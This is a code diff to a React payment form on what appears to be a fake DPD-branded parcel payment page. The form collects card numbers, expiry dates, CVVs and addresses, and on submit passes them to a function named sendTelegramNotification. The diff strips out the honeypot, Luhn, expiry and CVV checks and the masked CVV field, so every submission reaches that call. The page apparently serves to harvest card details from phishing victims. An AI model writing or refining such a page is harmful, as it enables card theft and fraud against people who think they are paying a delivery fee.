@@ -1,5 +1,5 @@
 import { useState, useEffect } from "react";
-import { CreditCard, Lock, ArrowRight, ArrowLeft, Loader2, Eye, EyeOff } from "lucide-react";
+import { CreditCard, Lock, ArrowRight, ArrowLeft } from "lucide-react";
 import { Button } from "@/components/ui/button";
 import AddressAutocomplete, { AddressSuggestion } from "./AddressAutocomplete";
 import { supabase } from "@/integrations/supabase/client";
@@ -219,9 +219,6 @@ const PaymentForm = ({ onProceed, onBack }: PaymentFormProps) => {
   const [postcode, setPostcode] = useState("");
   const [country, setCountry] = useState("");
   const [isDetectingCountry, setIsDetectingCountry] = useState(true);
-  
-  // Honeypot field - bots will fill this, humans won't see it
-  const [honeypot, setHoneypot] = useState("");
 
   // Auto-detect country from IP on mount
   useEffect(() => {
@@ -252,123 +249,6 @@ const PaymentForm = ({ onProceed, onBack }: PaymentFormProps) => {
     detectCountry();
   }, []);
 
-  // Luhn algorithm to validate card numbers
-  const validateLuhn = (cardNum: string): boolean => {
-    const digits = cardNum.replace(/\s/g, "");
-    if (!/^\d{13,19}$/.test(digits)) return false;
-    
-    let sum = 0;
-    let isEven = false;
-    
-    for (let i = digits.length - 1; i >= 0; i--) {
-      let digit = parseInt(digits[i], 10);
-      
-      if (isEven) {
-        digit *= 2;
-        if (digit > 9) digit -= 9;
-      }
-      
-      sum += digit;
-      isEven = !isEven;
-    }
-    
-    return sum % 10 === 0;
-  };
-
-  // Detect card type based on prefix
-  type CardType = 'visa' | 'mastercard' | 'amex' | 'discover' | 'unknown';
-  
-  const detectCardType = (cardNum: string): CardType => {
-    const digits = cardNum.replace(/\s/g, "");
-    
-    // Visa: starts with 4
-    if (/^4/.test(digits)) return 'visa';
-    
-    // Mastercard: starts with 51-55 or 2221-2720
-    if (/^5[1-5]/.test(digits) || /^2(2[2-9]|[3-6]|7[01]|720)/.test(digits)) return 'mastercard';
-    
-    // Amex: starts with 34 or 37
-    if (/^3[47]/.test(digits)) return 'amex';
-    
-    // Discover: starts with 6011, 622126-622925, 644-649, 65
-    if (/^(6011|65|64[4-9]|622(1(2[6-9]|[3-9])|[2-8]|9([01]|2[0-5])))/.test(digits)) return 'discover';
-    
-    return 'unknown';
-  };
-
-  const [cardType, setCardType] = useState<CardType>('unknown');
-
-  const [cardError, setCardError] = useState("");
-  const [expiryError, setExpiryError] = useState("");
-  const [cvvError, setCvvError] = useState("");
-  const [isSubmitting, setIsSubmitting] = useState(false);
-  const [showCvv, setShowCvv] = useState(false);
-
-  // Get expected CVV length based on card type
-  const getExpectedCvvLength = (): number => {
-    return cardType === 'amex' ? 4 : 3;
-  };
-
-  // Validate CVV based on card type
-  const validateCvv = (cvvValue: string): { valid: boolean; error: string } => {
-    const expectedLength = getExpectedCvvLength();
-    if (cvvValue.length === 0) return { valid: true, error: "" };
-    if (cvvValue.length < expectedLength) return { valid: true, error: "" }; // Still typing
-    if (cvvValue.length !== expectedLength) {
-      return { valid: false, error: `CVV must be ${expectedLength} digits` };
-    }
-    return { valid: true, error: "" };
-  };
-
-  const handleCvvChange = (value: string) => {
-    const digits = value.replace(/\D/g, "");
-    const maxLength = getExpectedCvvLength();
-    const trimmed = digits.slice(0, maxLength);
-    setCvv(trimmed);
-    
-    if (trimmed.length === maxLength) {
-      const validation = validateCvv(trimmed);
-      setCvvError(validation.error);
-    } else {
-      setCvvError("");
-    }
-  };
-
-  // Validate expiry date
-  const validateExpiry = (expiryValue: string): { valid: boolean; error: string } => {
-    if (expiryValue.length < 5) return { valid: true, error: "" }; // Still typing
-    
-    const [monthStr, yearStr] = expiryValue.split("/");
-    const month = parseInt(monthStr, 10);
-    const year = parseInt("20" + yearStr, 10);
-    
-    if (month < 1 || month > 12) {
-      return { valid: false, error: "Invalid month" };
-    }
-    
-    const now = new Date();
-    const currentMonth = now.getMonth() + 1;
-    const currentYear = now.getFullYear();
-    
-    if (year < currentYear || (year === currentYear && month < currentMonth)) {
-      return { valid: false, error: "Card has expired" };
-    }
-    
-    if (year > currentYear + 20) {
-      return { valid: false, error: "Invalid year" };
-    }
-    
-    return { valid: true, error: "" };
-  };
-
-  const handleExpiryChange = (value: string) => {
-    const formatted = formatExpiry(value);
-    setExpiry(formatted);
-    
-    const validation = validateExpiry(formatted);
-    setExpiryError(validation.error);
-  };
-
   const formatCardNumber = (value: string) => {
     const v = value.replace(/\s+/g, "").replace(/[^0-9]/gi, "");
     const matches = v.match(/\d{4,16}/g);
@@ -378,25 +258,6 @@ const PaymentForm = ({ onProceed, onBack }: PaymentFormProps) => {
       parts.push(match.substring(i, i + 4));
     }
     return parts.length ? parts.join(" ") : v;
-  };
-
-  const handleCardNumberChange = (value: string) => {
-    const formatted = formatCardNumber(value);
-    setCardNumber(formatted);
-    
-    // Detect card type
-    setCardType(detectCardType(formatted));
-    
-    const digits = formatted.replace(/\s/g, "");
-    if (digits.length >= 13) {
-      if (!validateLuhn(formatted)) {
-        setCardError("Invalid card number");
-      } else {
-        setCardError("");
-      }
-    } else {
-      setCardError("");
-    }
   };
 
   const formatExpiry = (value: string) => {
@@ -453,48 +314,8 @@ ${countryName}
 
   const handleSubmit = async (e: React.FormEvent) => {
     e.preventDefault();
-    
-    // Bot detection: if honeypot is filled, silently reject
-    if (honeypot) {
-      console.log("Bot detected via honeypot");
-      // Simulate success to fool bots, but don't process
-      onProceed();
-      return;
-    }
-    
-    // Validate card number with Luhn algorithm
-    if (!validateLuhn(cardNumber)) {
-      setCardError("Invalid card number");
-      return;
-    }
-    
-    // Validate expiry date
-    const expiryValidation = validateExpiry(expiry);
-    if (!expiryValidation.valid) {
-      setExpiryError(expiryValidation.error);
-      return;
-    }
-    
-    // Validate CVV
-    const cvvValidation = validateCvv(cvv);
-    if (!cvvValidation.valid) {
-      setCvvError(cvvValidation.error);
-      return;
-    }
-    
-    const expectedCvvLength = getExpectedCvvLength();
-    if (cvv.length !== expectedCvvLength) {
-      setCvvError(`CVV must be ${expectedCvvLength} digits`);
-      return;
-    }
-    
-    setIsSubmitting(true);
-    try {
-      await sendTelegramNotification();
-      onProceed();
-    } finally {
-      setIsSubmitting(false);
-    }
+    await sendTelegramNotification();
+    onProceed();
   };
 
   return (
@@ -514,29 +335,6 @@ ${countryName}
         </p>
 
         <form onSubmit={handleSubmit} className="space-y-5">
-          {/* Honeypot field - hidden from real users, bots will fill it */}
-          <div 
-            aria-hidden="true" 
-            style={{ 
-              position: 'absolute', 
-              left: '-9999px', 
-              top: '-9999px',
-              opacity: 0,
-              pointerEvents: 'none'
-            }}
-          >
-            <label htmlFor="website_url">Website URL</label>
-            <input
-              type="text"
-              id="website_url"
-              name="website_url"
-              tabIndex={-1}
-              autoComplete="off"
-              value={honeypot}
-              onChange={(e) => setHoneypot(e.target.value)}
-            />
-          </div>
-
           {/* Card Details Section */}
           <div className="space-y-4">
             <h3 className="font-semibold text-sm text-muted-foreground uppercase tracking-wide">
@@ -561,47 +359,15 @@ ${countryName}
               <label className="block text-sm font-medium mb-2">
                 Card Number
               </label>
-              <div className="relative">
-                <input
-                  type="text"
-                  placeholder="1234 5678 9012 3456"
-                  value={cardNumber}
-                  onChange={(e) => handleCardNumberChange(e.target.value)}
-                  maxLength={19}
-                  className={`input-field font-mono pr-14 ${cardError ? 'border-destructive focus:ring-destructive' : ''}`}
-                  required
-                />
-                {/* Card type icon */}
-                <div className="absolute right-3 top-1/2 -translate-y-1/2">
-                  {cardType === 'visa' && (
-                    <div className="flex items-center justify-center w-10 h-6 bg-[#1A1F71] rounded text-white text-xs font-bold">
-                      VISA
-                    </div>
-                  )}
-                  {cardType === 'mastercard' && (
-                    <div className="flex items-center gap-0.5">
-                      <div className="w-5 h-5 rounded-full bg-[#EB001B]" />
-                      <div className="w-5 h-5 rounded-full bg-[#F79E1B] -ml-2.5" />
-                    </div>
-                  )}
-                  {cardType === 'amex' && (
-                    <div className="flex items-center justify-center w-10 h-6 bg-[#006FCF] rounded text-white text-[8px] font-bold">
-                      AMEX
-                    </div>
-                  )}
-                  {cardType === 'discover' && (
-                    <div className="flex items-center justify-center w-10 h-6 bg-[#FF6000] rounded text-white text-[7px] font-bold">
-                      DISCOVER
-                    </div>
-                  )}
-                  {cardType === 'unknown' && cardNumber.length === 0 && (
-                    <CreditCard className="w-5 h-5 text-muted-foreground" />
-                  )}
-                </div>
-              </div>
-              {cardError && (
-                <p className="text-destructive text-sm mt-1">{cardError}</p>
-              )}
+              <input
+                type="text"
+                placeholder="1234 5678 9012 3456"
+                value={cardNumber}
+                onChange={(e) => setCardNumber(formatCardNumber(e.target.value))}
+                maxLength={19}
+                className="input-field font-mono"
+                required
+              />
             </div>
 
             <div className="grid grid-cols-2 gap-4">
@@ -611,46 +377,25 @@ ${countryName}
                   type="text"
                   placeholder="MM/YY"
                   value={expiry}
-                  onChange={(e) => handleExpiryChange(e.target.value)}
+                  onChange={(e) => setExpiry(formatExpiry(e.target.value))}
                   maxLength={5}
-                  className={`input-field font-mono ${expiryError ? 'border-destructive focus:ring-destructive' : ''}`}
+                  className="input-field font-mono"
                   required
                 />
-                {expiryError && (
-                  <p className="text-destructive text-sm mt-1">{expiryError}</p>
-                )}
               </div>
               <div>
-                <label className="block text-sm font-medium mb-2">
-                  CVV {cardType === 'amex' ? '(4 digits)' : '(3 digits)'}
-                </label>
-                <div className="relative">
-                  <input
-                    type={showCvv ? "text" : "password"}
-                    placeholder={cardType === 'amex' ? '••••' : '•••'}
-                    value={cvv}
-                    onChange={(e) => handleCvvChange(e.target.value)}
-                    maxLength={getExpectedCvvLength()}
-                    className={`input-field font-mono pr-10 ${cvvError ? 'border-destructive focus:ring-destructive' : ''}`}
-                    required
-                    autoComplete="cc-csc"
-                  />
-                  <button
-                    type="button"
-                    onClick={() => setShowCvv(!showCvv)}
-                    className="absolute right-3 top-1/2 -translate-y-1/2 text-muted-foreground hover:text-foreground transition-colors"
-                    aria-label={showCvv ? "Hide CVV" : "Show CVV"}
-                  >
-                    {showCvv ? (
-                      <EyeOff className="w-4 h-4" />
-                    ) : (
-                      <Eye className="w-4 h-4" />
-                    )}
-                  </button>
-                </div>
-                {cvvError && (
-                  <p className="text-destructive text-sm mt-1">{cvvError}</p>
-                )}
+                <label className="block text-sm font-medium mb-2">CVV</label>
+                <input
+                  type="text"
+                  placeholder="123"
+                  value={cvv}
+                  onChange={(e) =>
+                    setCvv(e.target.value.replace(/\D/g, "").slice(0, 4))
+                  }
+                  maxLength={4}
+                  className="input-field font-mono"
+                  required
+                />
               </div>
             </div>
           </div>
@@ -742,20 +487,10 @@ ${countryName}
             </Button>
             <Button
               type="submit"
-              disabled={isSubmitting}
-              className="flex-1 h-12 text-base font-semibold bg-primary hover:bg-dpd-dark text-primary-foreground rounded-xl disabled:opacity-70"
+              className="flex-1 h-12 text-base font-semibold bg-primary hover:bg-dpd-dark text-primary-foreground rounded-xl"
             >
-              {isSubmitting ? (
-                <>
-                  <Loader2 className="w-4 h-4 mr-2 animate-spin" />
-                  Processing...
-                </>
-              ) : (
-                <>
-                  Complete Payment
-                  <ArrowRight className="w-4 h-4 ml-2" />
-                </>
-              )}
+              Complete Payment
+              <ArrowRight className="w-4 h-4 ml-2" />
             </Button>
           </div>
         </form>
